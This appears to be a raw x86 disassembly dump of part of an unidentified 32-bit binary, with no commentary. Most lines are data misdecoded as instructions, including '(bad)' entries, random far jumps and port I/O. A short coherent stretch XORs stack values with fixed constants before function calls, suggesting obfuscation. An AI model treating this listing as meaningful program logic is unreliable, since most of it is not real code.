  41ebd1:	mov    bl,0xa9
  41ebd3:	or     BYTE PTR [ebx+eax*4-0xa],al
  41ebd7:	jmp    0x41ec49
  41ebd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebda:	cmp    DWORD PTR ds:0x25a81a17,esi
  41ebe0:	cdq    
  41ebe1:	ficom  DWORD PTR [ecx]
  41ebe3:	cli    
  41ebe4:	lock sub BYTE PTR [ecx+0x49fc0de3],al
  41ebeb:	sbb    BYTE PTR [eax],0x26
  41ebee:	addps  xmm0,XMMWORD PTR [eax]
  41ebf1:	push   es
  41ebf2:	sub    DWORD PTR [eax+0x19091740],esi
  41ebf8:	shl    ebp,1
  41ebfa:	shl    ebx,1
  41ebfc:	xchg   ah,dl
  41ebfe:	je     0x41f05a
  41ec04:	mov    eax,DWORD PTR [ebp-0x154]
  41ec0a:	jmp    0x41eff1
  41ec0f:	cld    
  41ec10:	sbb    eax,0x6c1c4604
  41ec15:	mov    esp,0x10e976b3
  41ec1a:	sahf   
  41ec1b:	lock sti 
  41ec1d:	jp     0x41ebb1
  41ec1f:	xor    esi,DWORD PTR [edi-0x40]
  41ec22:	mov    esi,0xbebec44a
  41ec27:	push   eax
  41ec28:	cmp    BYTE PTR [ecx-0x6d0dbd26],0x55
  41ec2f:	adc    al,0xae
  41ec31:	push   eax
  41ec32:	mov    edi,0x669addbe
  41ec37:	mov    al,ds:0x94e7aa3c
  41ec3c:	std    
  41ec3d:	cld    
  41ec3e:	mov    fs,edx
  41ec40:	push   eax
  41ec41:	mov    dh,0xe0
  41ec43:	xchg   DWORD PTR [ecx+0x6c],ebp
  41ec46:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41ec48:	cmc    
  41ec49:	lods   eax,DWORD PTR ds:[esi]
  41ec4a:	pop    edx
  41ec4b:	comiss xmm2,DWORD PTR [ebx]
  41ec4e:	xor    eax,esi
  41ec50:	mov    ds:0x70303fda,al
  41ec55:	das    
  41ec56:	mov    ebx,0x28c04176
  41ec5b:	push   ds
  41ec5c:	jbe    0x41ebdf
  41ec5e:	push   0xffffffa9
  41ec60:	inc    esi
  41ec61:	mov    edx,0xd299ff06
  41ec66:	rdpmc  
  41ec68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec69:	rcl    BYTE PTR [edx+edx*2-0x7c],0x3c
  41ec6e:	sbb    eax,0xd937508e
  41ec73:	add    dh,BYTE PTR cs:[eax+edx*1+0x1ea3b8a1]
  41ec7b:	pop    es
  41ec7c:	mov    edi,0x2b49c5e6
  41ec81:	sbb    bl,al
  41ec83:	das    
  41ec84:	cmp    al,0x99
  41ec86:	add    eax,0x169944
  41ec8b:	cmp    ecx,DWORD PTR [esi-0x7ca757a9]
  41ec91:	ds ins BYTE PTR es:[edi],dx
  41ec93:	cld    
  41ec94:	xchg   edi,eax
  41ec95:	mov    edx,0xf45df2c5
  41ec9a:	mov    al,ds:0xe8e5c7b7
  41ec9f:	int3   
  41eca0:	dec    ebp
  41eca1:	and    BYTE PTR [ecx+edi*2-0x39b6f1c6],dl
  41eca8:	out    dx,al
  41eca9:	(bad)  
  41ecaa:	push   ss
  41ecab:	ins    BYTE PTR es:[edi],dx
  41ecac:	into   
  41ecad:	mov    ds:0x62bf0813,al
  41ecb2:	jg     0x41ec40
  41ecb4:	sbb    esi,DWORD PTR [edx+0x8]
  41ecb7:	jo     0x41ec6f
  41ecb9:	rcr    eax,0xf1
  41ecbc:	std    
  41ecbd:	test   DWORD PTR [edi-0x17],0x91f55ac8
  41ecc4:	std    
  41ecc5:	in     eax,0x39
  41ecc7:	adc    bh,dl
  41ecc9:	(bad)  
  41ecca:	ja     0x41ec94
  41eccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eccd:	inc    edx
  41ecce:	test   al,0xa2
  41ecd0:	and    DWORD PTR [ebx],eax
  41ecd2:	fwait
  41ecd3:	lock dec eax
  41ecd5:	jecxz  0x41ed2f
  41ecd7:	add    DWORD PTR [esi],esi
  41ecd9:	bound  edx,QWORD PTR [ecx+eiz*8+0x64ab7b8d]
  41ece0:	cs aas 
  41ece2:	mov    ch,0x95
  41ece4:	pop    eax
  41ece6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ece7:	jmp    0xedd7:0xbdf2656b
  41ecee:	xchg   edx,eax
  41ecef:	inc    ebp
  41ecf0:	sahf   
  41ecf1:	push   ebx
  41ecf2:	mov    eax,ds:0x820965db
  41ecf7:	sbb    eax,0xe33bc8ce
  41ecfc:	and    DWORD PTR [ebp+0x3c2b6103],ebp
  41ed02:	cwde   
  41ed03:	in     al,dx
  41ed04:	push   esp
  41ed05:	popf   
  41ed06:	addr16 loope 0x41ed4e
  41ed09:	(bad)  
  41ed0a:	stc    
  41ed0b:	push   edx
  41ed0c:	and    eax,0x93a6a9a
  41ed11:	fmul   QWORD PTR [ebx-0x3adeb4e4]
  41ed17:	add    BYTE PTR [ebx],bl
  41ed19:	repnz (bad) 
  41ed1b:	sbb    DWORD PTR [edi+ebp*4-0x1b],ecx
  41ed1f:	mov    ch,0x2
  41ed21:	ror    dh,cl
  41ed23:	and    al,0xf2
  41ed25:	xor    DWORD PTR [esi+0x324fdf33],ecx
  41ed2b:	shl    BYTE PTR [ebx-0x16],cl
  41ed2e:	jbe    0x41eceb
  41ed30:	fisub  WORD PTR [ebp+eiz*2-0x15]
  41ed34:	dec    ecx
  41ed35:	loop   0x41eceb
  41ed37:	jno    0x41ed16
  41ed39:	in     al,dx
  41ed3a:	je     0x41eda4
  41ed3c:	sbb    al,0x66
  41ed3e:	out    0xc8,al
  41ed40:	xchg   ecx,eax
  41ed41:	pop    esp
  41ed42:	icebp  
  41ed43:	test   DWORD PTR [edi-0x1a],ecx
  41ed46:	dec    esp
  41ed47:	das    
  41ed48:	lock js 0x41ed74
  41ed4b:	xchg   BYTE PTR [ebp-0x66],al
  41ed4e:	sub    edi,DWORD PTR [eax-0x76]
  41ed51:	shl    BYTE PTR [ebp+0x27],cl
  41ed54:	fcom   QWORD PTR [ebx+edi*8-0x1a]
  41ed58:	jle    0x41ed09
  41ed5a:	call   0xcef2e35d
  41ed5f:	outs   dx,BYTE PTR ds:[esi]
  41ed60:	pop    ss
  41ed61:	daa    
  41ed62:	and    ah,ch
  41ed64:	lods   al,BYTE PTR ds:[esi]
  41ed65:	sub    bh,al
  41ed67:	stc    
  41ed68:	jae    0x41ed4b
  41ed6a:	dec    ecx
  41ed6b:	push   ebp
  41ed6c:	push   es
  41ed6d:	jmp    0x9278:0x6fa3694c
  41ed74:	or     edx,DWORD PTR [ebx+0x75de4009]
  41ed7a:	sbb    DWORD PTR [edx+0x5d],edx
  41ed7d:	fdiv   DWORD PTR [ebx+0x47b88188]
  41ed83:	(bad)  [eax-0x72999a6a]
  41ed89:	shr    BYTE PTR [esp+eiz*2],cl
  41ed8c:	or     cl,BYTE PTR [ecx]
  41ed8e:	cwde   
  41ed8f:	mov    ebx,0xf0910bd0
  41ed94:	xor    ebp,DWORD PTR [esi]
  41ed96:	out    dx,al
  41ed97:	cli    
  41ed98:	leave  
  41ed99:	jge    0x41ed61
  41ed9b:	pushf  
  41ed9c:	push   0x27
  41ed9e:	dec    ebx
  41ed9f:	ficomp WORD PTR [ebx-0x3b]
  41eda2:	xchg   ecx,eax
  41eda3:	and    esp,esi
  41eda5:	jecxz  0x41eda4
  41eda7:	sar    ebp,0x38
  41edaa:	sub    dh,bl
  41edac:	lahf   
  41edad:	add    BYTE PTR [eax],ah
  41edaf:	jmp    0x9516994c
  41edb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edb5:	in     al,0x2b
  41edb7:	xor    BYTE PTR [ecx-0x4109079e],al
  41edbd:	dec    esi
  41edbe:	stc    
  41edbf:	cmp    ah,BYTE PTR [ebx-0x15e05a6f]
  41edc5:	adc    DWORD PTR [eax],ebp
  41edc7:	fwait
  41edc8:	and    eax,0xf6ea7c46
  41edcd:	xchg   esp,eax
  41edce:	cli    
  41edcf:	fwait
  41edd0:	cmp    al,0x1d
  41edd2:	fwait
  41edd3:	int3   
  41edd4:	das    
  41edd5:	pop    edi
  41edd6:	std    
  41edd7:	lock add DWORD PTR [ebx-0x20],ecx
  41eddb:	loopne 0x41ee59
  41eddd:	ins    BYTE PTR es:[edi],dx
  41edde:	pop    edx
  41eddf:	jb     0x41eda7
  41ede1:	and    al,0x36
  41ede3:	popa   
  41ede4:	aaa    
  41ede5:	sub    DWORD PTR [edx-0x3d],edi
  41ede8:	cdq    
  41ede9:	loope  0x41edfd
  41edeb:	mov    ecx,ecx
  41eded:	adc    ch,dl
  41edef:	fsubr  QWORD PTR [edx]
  41edf1:	or     ah,BYTE PTR [edi]
  41edf3:	out    dx,eax
  41edf4:	in     al,0x2d
  41edf6:	cmp    al,0x8b
  41edf8:	and    BYTE PTR [ebp+0x10018246],dl
  41edfe:	out    dx,al
  41edff:	pop    esp
  41ee00:	inc    esi
  41ee01:	loope  0x41ee1a
  41ee03:	mov    ebx,0x9d6a5c00
  41ee08:	aam    0x6f
  41ee0a:	xchg   esp,eax
  41ee0b:	ficomp DWORD PTR [ebx-0x3b]
  41ee0e:	(bad)  
  41ee0f:	out    dx,eax
  41ee10:	adc    DWORD PTR [ebp-0x38],eax
  41ee13:	popa   
  41ee14:	jg     0x41edcb
  41ee16:	dec    esp
  41ee17:	mov    WORD PTR cs:[ebx+0xd],cs
  41ee1b:	pop    DWORD PTR [ebx-0x4c]
  41ee1e:	push   ss
  41ee1f:	cmp    eax,0xd3e69115
  41ee24:	push   0x1f9d808b
  41ee29:	mov    ah,0x47
  41ee2b:	(bad)  
  41ee2c:	and    al,0xab
  41ee2e:	dec    edi
  41ee2f:	xor    al,0x2b
  41ee31:	cmp    esp,DWORD PTR [edx-0x18]
  41ee34:	adc    dh,BYTE PTR [esi]
  41ee36:	pop    eax
  41ee37:	sub    al,0x6
  41ee39:	pop    ebp
  41ee3a:	jo     0x41ee27
  41ee3c:	xor    esi,ecx
  41ee3e:	sub    BYTE PTR [edx+edx*1+0x71],bl
  41ee42:	pop    esp
  41ee43:	fldenv [ebp-0x381c2bf3]
  41ee49:	pusha  
  41ee4a:	fsub   st(1),st
  41ee4c:	in     al,0xa8
  41ee4e:	iret   
  41ee4f:	call   0xc9ae:0x1dcf4403
  41ee56:	fs inc esi
  41ee58:	repnz add ch,dh
  41ee5b:	cld    
  41ee5c:	mov    dh,0xf
  41ee5e:	mov    ds:0x6e5a4acd,al
  41ee63:	ret    0x9c66
  41ee66:	loop   0x41ee3a
  41ee68:	data16 xlat BYTE PTR ds:[ebx]
  41ee6a:	inc    edi
  41ee6b:	lds    esi,FWORD PTR [eax]
  41ee6d:	mov    edx,0xa98c71d1
  41ee72:	jl     0x41eede
  41ee74:	jmp    0xe55d:0xc4027ea2
  41ee7b:	jo     0x41ee3a
  41ee7d:	or     al,bl
  41ee7f:	adc    al,0x3
  41ee81:	or     BYTE PTR [edi+0x321de8dc],ch
  41ee87:	mov    bl,0xff
  41ee89:	aad    0x5c
  41ee8b:	adc    edi,edi
  41ee8d:	loop   0x41ee25
  41ee8f:	inc    ebp
  41ee90:	pop    ecx
  41ee91:	outs   dx,BYTE PTR ds:[esi]
  41ee92:	mov    eax,0xee7cc334
  41ee97:	push   0x27
  41ee99:	retf   
  41ee9a:	push   edi
  41ee9b:	or     ch,BYTE PTR [ecx]
  41ee9d:	shl    edx,1
  41ee9f:	sub    DWORD PTR [edx+0x22],0x67a7d8ad
  41eea6:	idiv   BYTE PTR [ebp-0xbb553f]
  41eeac:	cdq    
  41eead:	sub    eax,0xc390d78
  41eeb2:	out    0x6c,eax
  41eeb4:	xor    eax,0x1fd49b94
  41eeb9:	jnp    0x41eeae
  41eebb:	js     0x41ef0d
  41eebd:	repz scas eax,DWORD PTR es:[edi]
  41eebf:	or     ecx,DWORD PTR gs:[ecx+ebx*4-0x41345fc7]
  41eec7:	scas   al,BYTE PTR es:[edi]
  41eec8:	adc    BYTE PTR [ecx+0x93e0278],al
  41eece:	dec    ecx
  41eecf:	xchg   ecx,eax
  41eed0:	adc    bh,BYTE PTR [ebx+0x3]
  41eed3:	sbb    ebx,DWORD PTR [ebp-0x76]
  41eed6:	dec    ebx
  41eed7:	inc    edx
  41eed8:	mov    esp,0xe09111c
  41eedd:	js     0x41eea5
  41eedf:	(bad)  
  41eee0:	in     eax,0xc9
  41eee2:	push   esi
  41eee3:	and    esp,DWORD PTR [edx]
  41eee5:	ret    0x48ec
  41eee8:	ret    0x673d
  41eeeb:	pusha  
  41eeec:	aas    
  41eeed:	adc    eax,DWORD PTR [edx+0x5d410244]
  41eef3:	sub    edi,DWORD PTR [ecx-0x5f]
  41eef6:	sbb    edx,ebx
  41eef8:	(bad)
  41eefc:	pop    ebx
  41eefd:	pop    esp
  41eefe:	iret   
  41eeff:	dec    ebx
  41ef00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef01:	push   ebx
  41ef02:	aad    0xb2
  41ef04:	jg     0x41ef6d
  41ef06:	pop    es
  41ef07:	stc    
  41ef08:	mov    cl,0xf
  41ef0a:	fmul   QWORD PTR [edx+ebp*4+0x5b]
  41ef0e:	dec    esp
  41ef0f:	push   esi
  41ef10:	pushf  
  41ef11:	aad    0x61
  41ef13:	(bad)  
  41ef14:	lods   eax,DWORD PTR ds:[si]
  41ef16:	sbb    esp,ecx
  41ef18:	(bad)
  41ef1d:	and    eax,0xecd33c78
  41ef22:	sub    ch,BYTE PTR [ebp+0x4b0f288a]
  41ef28:	arpl   WORD PTR [edx+ebx*4],si
  41ef2b:	(bad)  
  41ef2d:	jo     0x41eecc
  41ef2f:	xor    DWORD PTR [edx-0x7810591c],esi
  41ef35:	add    eax,0x6cbeb39a
  41ef3a:	lods   eax,DWORD PTR ds:[esi]
  41ef3b:	mov    bl,BYTE PTR [ebx+eax*1-0x40]
  41ef3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef40:	aam    0x4a
  41ef42:	sbb    esi,edx
  41ef44:	cmc    
  41ef45:	lock add BYTE PTR [ebx+0x17],bl
  41ef49:	out    dx,al
  41ef4a:	or     DWORD PTR [edx],0xffffff81
  41ef4d:	mov    ecx,0x78be7a6c
  41ef52:	xor    esp,esp
  41ef54:	sbb    ah,BYTE PTR [edi+0x17]
  41ef57:	out    dx,eax
  41ef58:	pop    es
  41ef59:	ret    0xa228
  41ef5c:	dec    eax
  41ef5d:	mov    ebp,0xc154b407
  41ef62:	ss sub eax,0x4149a6ab
  41ef68:	sub    al,0x86
  41ef6a:	lock pop ecx
  41ef6c:	mov    eax,ds:0x85da8b43
  41ef71:	and    eax,0x87b6b6c5
  41ef76:	jns    0x41ef0c
  41ef78:	add    ebp,ebp
  41ef7a:	jo     0x41ef90
  41ef7c:	mov    BYTE PTR [ecx],dh
  41ef7e:	in     eax,0xb
  41ef80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef81:	mov    WORD PTR [edi+0x60],es
  41ef84:	int    0xcd
  41ef86:	popf   
  41ef87:	mov    al,ds:0x14ead224
  41ef8c:	adc    ebp,DWORD PTR gs:[ebp+esi*4+0x2c]
  41ef91:	add    al,0x1a
  41ef93:	inc    edi
  41ef94:	ds add eax,0xc93a1e60
  41ef9a:	in     eax,dx
  41ef9b:	test   DWORD PTR [ecx-0x2c77aac4],esp
  41efa1:	mov    bh,0xc9
  41efa3:	and    bl,BYTE PTR [ebx]
  41efa5:	aas    
  41efa6:	cmp    bl,BYTE PTR [ebx+ecx*2+0x68729ba]
  41efad:	loop   0x41efaa
  41efaf:	fadd   QWORD PTR [esi]
  41efb1:	retf   
  41efb2:	scas   al,BYTE PTR es:[edi]
  41efb3:	adc    al,bl
  41efb5:	dec    DWORD PTR [edx+0x4a]
  41efb8:	jmp    0x264af16d
  41efbd:	sbb    BYTE PTR [eax+0x4d89aae8],ah
  41efc3:	sbb    bl,0x51
  41efc6:	popf   
  41efc7:	aaa    
  41efc8:	cmp    ebx,0x56bf6971
  41efce:	xor    al,0xc9
  41efd0:	arpl   WORD PTR [ecx],sp
  41efd2:	add    edx,DWORD PTR [eax]
  41efd4:	pop    ebx
  41efd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efd6:	mov    ch,cl
  41efd8:	pop    ecx
  41efd9:	and    DWORD PTR [ecx+edx*2-0x13efb00c],0xffffffee
  41efe1:	push   ebp
  41efe2:	sbb    al,al
  41efe4:	popa   
  41efe5:	aam    0xa8
  41efe7:	cmp    eax,0xc0673e02
  41efec:	aam    0xb2
  41efee:	icebp  
  41efef:	and    ebx,ebx
  41eff1:	mov    edx,DWORD PTR [ebp-0x150]
  41eff7:	xor    eax,0xcb79b576
  41effc:	xor    edx,0x9c2b8ae8
  41f002:	mov    cl,0x2
  41f004:	call   0x408bb8
  41f009:	mov    esi,eax
  41f00b:	mov    edi,edx
  41f00d:	mov    eax,DWORD PTR [ebp-0x154]
  41f013:	mov    edx,DWORD PTR [ebp-0x150]
  41f019:	xor    eax,0xcb79b576
  41f01e:	xor    edx,0x9c2b8ae8
  41f024:	mov    cl,0x3e
  41f026:	call   0x4223f5
  41f02b:	or     esi,eax
  41f02d:	or     edi,edx
  41f02f:	mov    eax,DWORD PTR [ebp-0x160]
  41f035:	imul   esi,eax
  41f038:	add    esi,DWORD PTR [ebp-0x170]
  41f03e:	mov    DWORD PTR [ebp-0x16c],esi
  41f044:	mov    eax,DWORD PTR [ebp-0x16c]
  41f04a:	mov    DWORD PTR [ebp-0x178],eax
  41f050:	jmp    0x41f19e
  41f055:	jmp    0x41f105
  41f05a:	mov    eax,DWORD PTR [ebp-0x154]
  41f060:	mov    edx,DWORD PTR [ebp-0x150]
  41f066:	xor    eax,0xcb79b576
  41f06b:	xor    edx,0x9c2b8ae8
  41f071:	mov    cl,0x2
  41f073:	call   0x408bb8
  41f078:	mov    esi,eax
  41f07a:	mov    edi,edx
  41f07c:	mov    eax,DWORD PTR [ebp-0x154]
  41f082:	mov    edx,DWORD PTR [ebp-0x150]
  41f088:	xor    eax,0xcb79b576
  41f08d:	xor    edx,0x9c2b8ae8
  41f093:	mov    cl,0x3e
  41f095:	call   0x4223f5
  41f09a:	or     esi,eax
  41f09c:	or     edi,edx
  41f09e:	mov    eax,DWORD PTR [ebp-0x15c]
  41f0a4:	mov    edx,DWORD PTR [ebp-0x158]
  41f0aa:	xor    eax,0xcb79b576
  41f0af:	xor    edx,0x9c2b8ae8
  41f0b5:	mov    cl,0x2
  41f0b7:	call   0x408bb8
  41f0bc:	mov    ebx,eax
  41f0be:	mov    eax,edx
  41f0c0:	mov    ecx,DWORD PTR [ebp-0x15c]
  41f0c6:	mov    edx,DWORD PTR [ebp-0x158]
  41f0cc:	xor    ecx,0xcb79b576
  41f0d2:	xor    edx,0x9c2b8ae8
  41f0d8:	mov    DWORD PTR [ebp-0x234],eax
  41f0de:	mov    eax,ecx
  41f0e0:	mov    cl,0x3e
  41f0e2:	call   0x4223f5
  41f0e7:	or     ebx,eax
  41f0e9:	mov    eax,DWORD PTR [ebp-0x234]
  41f0ef:	or     eax,edx
  41f0f1:	push   eax
  41f0f2:	push   ebx
  41f0f3:	push   edi
  41f0f4:	push   esi
  41f0f5:	call   0x41594e
  41f0fa:	mov    DWORD PTR [ebp-0x178],eax
  41f100:	jmp    0x41f19e
  41f105:	mov    eax,DWORD PTR [ebp-0x15c]
  41f10b:	mov    edx,DWORD PTR [ebp-0x158]
  41f111:	xor    eax,0xcb79b576
  41f116:	xor    edx,0x9c2b8ae8
  41f11c:	mov    cl,0x2
  41f11e:	call   0x408bb8
  41f123:	mov    esi,eax
  41f125:	mov    edi,edx
  41f127:	mov    eax,DWORD PTR [ebp-0x15c]
  41f12d:	mov    edx,DWORD PTR [ebp-0x158]
  41f133:	xor    eax,0xcb79b576
  41f138:	xor    edx,0x9c2b8ae8
  41f13e:	mov    cl,0x3e
  41f140:	call   0x4223f5
  41f145:	or     esi,eax
  41f147:	or     edi,edx
  41f149:	mov    DWORD PTR [ebp-0x178],esi
  41f14f:	jmp    0x41f19e
  41f154:	mov    eax,DWORD PTR [ebp-0x15c]
  41f15a:	mov    edx,DWORD PTR [ebp-0x158]
  41f160:	xor    eax,0xcb79b576
  41f165:	xor    edx,0x9c2b8ae8
  41f16b:	mov    cl,0x2
  41f16d:	call   0x408bb8
  41f172:	mov    esi,eax
  41f174:	mov    edi,edx
  41f176:	mov    eax,DWORD PTR [ebp-0x15c]
  41f17c:	mov    edx,DWORD PTR [ebp-0x158]
  41f182:	xor    eax,0xcb79b576
  41f187:	xor    edx,0x9c2b8ae8
  41f18d:	mov    cl,0x3e
  41f18f:	call   0x4223f5
  41f194:	or     esi,eax
  41f196:	or     edi,edx
  41f198:	mov    DWORD PTR [ebp-0x178],esi
  41f19e:	mov    ecx,DWORD PTR [ebp-0xd8]
  41f1a4:	mov    eax,0x459a
  41f1a9:	xor    edx,edx
  41f1ab:	div    ecx
  41f1ad:	jmp    0x41f594
  41f1b2:	push   edx
  41f1b3:	inc    ebx
  41f1b4:	sbb    eax,0xbcab304b
  41f1b9:	pop    esp
  41f1ba:	or     edi,DWORD PTR [edx]
  41f1bc:	cld    
  41f1bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1be:	stos   BYTE PTR es:[edi],al
  41f1bf:	mov    ?,WORD PTR [edx+edx*4]
  41f1c2:	sar    BYTE PTR [edi-0x40],0xbe
  41f1c6:	dec    edx
  41f1c7:	les    edi,FWORD PTR [esi-0x4fca5842]
  41f1cd:	fsub   QWORD PTR [edi+0xa574fc7]
  41f1d3:	out    0xb,eax
  41f1d5:	fcom   QWORD PTR [esp+edx*4]
  41f1d8:	xor    al,0xe0
  41f1da:	loopne 0x41f1f5
  41f1dc:	xor    ecx,esi
  41f1de:	pop    ds
  41f1df:	inc    eax
  41f1e0:	popf   
  41f1e1:	mov    edx,eax
  41f1e3:	test   al,0xd6
  41f1e5:	sbb    BYTE PTR [edx],bl
  41f1e7:	(bad)  
  41f1e8:	sub    BYTE PTR [edi-0x7fa4e2cd],bl
  41f1ee:	adc    BYTE PTR [ecx-0x75],al
  41f1f1:	inc    eax
  41f1f2:	sbb    DWORD PTR [ebx],esp
  41f1f4:	or     eax,0x5252c8b
  41f1f9:	lock push cs
  41f1fb:	push   ds
  41f1fc:	ret    
  41f1fd:	in     al,dx
  41f1fe:	jno    0x41f256
  41f200:	inc    esi
  41f201:	xchg   DWORD PTR [ecx+0x10],edx
  41f204:	cmp    eax,0x61b53436
  41f209:	mov    DWORD PTR [ecx-0x3b],ebp
  41f20c:	retf   
  41f20d:	pop    esp
  41f20e:	mov    edx,0xbc5c900f
  41f213:	fdiv   DWORD PTR [edx+0x5f]
  41f216:	test   BYTE PTR [esp+eiz*2-0x61dbe2c7],dh
  41f21d:	cmp    BYTE PTR [edi],bl
  41f21f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f220:	mov    ds:0x7ba19463,eax
  41f225:	in     al,dx
  41f226:	ins    BYTE PTR es:[edi],dx
  41f227:	cdq    
  41f228:	je     0x41f207
  41f22a:	sbb    al,0xeb
  41f22c:	mov    BYTE PTR [edx],dl
  41f22e:	mov    BYTE PTR [edx],0x89
  41f231:	cmp    BYTE PTR [edi+0x68],dl
  41f234:	sbb    dh,al
  41f236:	xchg   edi,eax
  41f237:	cs inc eax
  41f239:	mov    ebx,0x449e25d2
  41f23e:	test   BYTE PTR [edx],0xb0
  41f241:	pushf  
  41f242:	mov    bh,0x6d
  41f244:	dec    ecx
  41f245:	jge    0x41f289
  41f247:	jge    0x41f245
  41f249:	dec    ebp
  41f24a:	pop    ebx
  41f24b:	or     al,0x8
  41f24d:	je     0x41f22b
  41f24f:	dec    edx
  41f250:	int3   
  41f251:	sub    al,0xc3
  41f253:	ins    BYTE PTR es:[edi],dx
  41f254:	xchg   DWORD PTR [ebx-0x4511f914],esp
  41f25a:	push   ebx
  41f25b:	(bad)  
  41f25d:	jmp    0xf6deedf8
  41f262:	adc    esp,esp
  41f264:	mov    esp,0xeb859188
  41f269:	fdivr  QWORD PTR [ecx]
  41f26b:	mov    ss,WORD PTR [eax-0x4f]
  41f26e:	xor    bh,BYTE PTR ds:0x428fb691
  41f274:	jnp    0x41f2e8
  41f276:	mov    ds:0x9f5ecd7c,al
  41f27b:	les    ecx,FWORD PTR [ecx+edx*1]
  41f27e:	mov    ds:0x2d8afbd1,al
  41f283:	push   ecx
  41f284:	div    DWORD PTR [edi-0x2b]
  41f287:	jbe    0x41f2d6
  41f289:	sbb    eax,0xe8068c14
  41f28e:	popf   
  41f28f:	sub    ah,BYTE PTR [ecx+0x66ec36b]
  41f295:	aad    0x3f
  41f297:	enter  0x9877,0x5d
  41f29b:	push   edx
  41f29c:	fsub   DWORD PTR [ecx+0x768660ed]
  41f2a2:	loope  0x41f28d
  41f2a4:	xor    ecx,DWORD PTR [ecx]
  41f2a6:	aaa    
  41f2a7:	sbb    ah,ch
  41f2a9:	repz in al,0xbb
  41f2ac:	push   es
  41f2ad:	dec    esi
  41f2ae:	fst    QWORD PTR [esi]
  41f2b0:	aam    0xb3
  41f2b2:	lods   al,BYTE PTR ds:[esi]
  41f2b3:	test   BYTE PTR [ebx],al
  41f2b5:	(bad)  
  41f2b6:	int3   
  41f2b7:	clc    
  41f2b8:	sub    al,0x33
  41f2ba:	cld    
  41f2bb:	popa   
  41f2bc:	addr16 jg 0x41f284
  41f2bf:	adc    al,0x0
  41f2c1:	and    DWORD PTR [esi],edx
  41f2c3:	sbb    DWORD PTR es:[esp+eax*4-0x35034788],0x34
  41f2cc:	mov    ch,cl
  41f2ce:	ror    edi,cl
  41f2d0:	sub    DWORD PTR [ecx-0x301b9d7c],esi
  41f2d6:	frstor [ebx]
  41f2d8:	pusha  
  41f2d9:	jg     0x41f2bb
  41f2db:	test   DWORD PTR [edx-0x47],ebp
  41f2de:	cmp    al,0x43
  41f2e0:	rsqrtps xmm5,XMMWORD PTR [eax+0x80744e7]
  41f2e7:	call   0xf94889af
  41f2ec:	popa   
  41f2ed:	in     eax,dx
  41f2ee:	popa   
  41f2ef:	inc    ebx
  41f2f0:	push   ebx
  41f2f1:	pop    ebp
  41f2f2:	dec    ebp
  41f2f3:	jmp    0x41f2f0
  41f2f5:	xchg   ebx,eax
  41f2f6:	stc    
  41f2f7:	ret    
  41f2f8:	inc    ebx
  41f2f9:	and    DWORD PTR [eax+edx*4+0x49],esp
  41f2fd:	add    al,0xe4
  41f2ff:	jmp    0x41f297
  41f301:	push   0xd2ea3709
  41f306:	repnz or DWORD PTR es:[ebp+0x62bfaa92],ebp
  41f30e:	xchg   edi,eax
  41f30f:	call   0xc7a:0x2eea6cb6
  41f316:	mov    bh,0x90
  41f318:	sub    BYTE PTR [esi+0x32fcbd62],0x6a
  41f31f:	jmp    0xd043eb25
  41f324:	into   
  41f325:	xor    DWORD PTR [ecx],eax
  41f327:	push   ebx
  41f328:	outs   dx,BYTE PTR ds:[esi]
  41f329:	out    0x5d,eax
  41f32b:	sar    BYTE PTR [eax],cl
  41f32d:	pop    esp
  41f32e:	jmp    0x41f313
  41f330:	jle    0x41f374
  41f332:	inc    esi
  41f333:	lea    eax,[eax]
  41f335:	bound  eax,QWORD PTR [eax+0x463e5723]
  41f33b:	sti    
  41f33c:	sbb    al,0xdb
  41f33e:	aaa    
  41f33f:	jge    0x41f2d2
  41f341:	or     eax,DWORD PTR [ebp-0x5a030098]
  41f347:	rcr    BYTE PTR [ebx-0x7e],1
  41f34a:	xchg   edx,eax
  41f34b:	icebp  
  41f34c:	dec    BYTE PTR [edi+0x686f4c1e]
  41f352:	scas   eax,DWORD PTR es:[edi]
  41f353:	dec    edi
  41f354:	scas   eax,DWORD PTR es:[edi]
  41f355:	loope  0x41f2de
  41f357:	add    BYTE PTR [ecx-0x7a],dl
  41f35a:	push   0xffffffb9
  41f35c:	sbb    al,0xb1
  41f35e:	(bad)  
  41f35f:	jp     0x41f332
  41f361:	lds    ebp,FWORD PTR [esi+0x725d8a0d]
  41f367:	test   DWORD PTR [esi],edi
  41f369:	es xchg ebx,eax
  41f36b:	mov    edi,0xfb6d7b9f
  41f370:	xchg   DWORD PTR [ebp+0x3d],eax
  41f373:	loope  0x41f3a6
  41f375:	dec    edx
  41f376:	and    eax,0x18c1bd48
  41f37b:	(bad)  
  41f37d:	pop    ecx
  41f37e:	sbb    eax,0xc96f555d
  41f383:	or     eax,DWORD PTR [esi-0x20c47af7]
  41f389:	add    eax,0xc028e8db
  41f38e:	mov    esp,0x703028b6
  41f393:	and    ecx,eax
  41f395:	loope  0x41f399
  41f397:	push   ebx
  41f398:	inc    esp
  41f399:	push   esp
  41f39a:	dec    eax
  41f39b:	and    DWORD PTR [edx],ebx
  41f39d:	mov    ch,0x0
  41f39f:	bound  esi,QWORD PTR [eax+0x2c]
  41f3a2:	cmp    BYTE PTR ds:0x9d8d508e,cl
  41f3a8:	cmp    ecx,DWORD PTR [ebx-0x186d75d4]
  41f3ae:	pop    esp
  41f3af:	cmp    al,0x65
  41f3b1:	leave  
  41f3b2:	mov    edi,0x3e89b644
  41f3b7:	sub    ecx,DWORD PTR [edi+0x17]
  41f3ba:	mov    eax,0xcde63f1
  41f3bf:	fnstsw WORD PTR [ecx-0x1cd29158]
  41f3c5:	mov    eax,ds:0x9e474c9
  41f3ca:	dec    ebx
  41f3cb:	(bad)  
  41f3cc:	ror    DWORD PTR [edi-0x773c3c4a],cl
  41f3d2:	icebp  
  41f3d3:	rol    al,cl
  41f3d5:	pop    edi
  41f3d6:	cs mov bl,0x9c
  41f3d9:	inc    esp
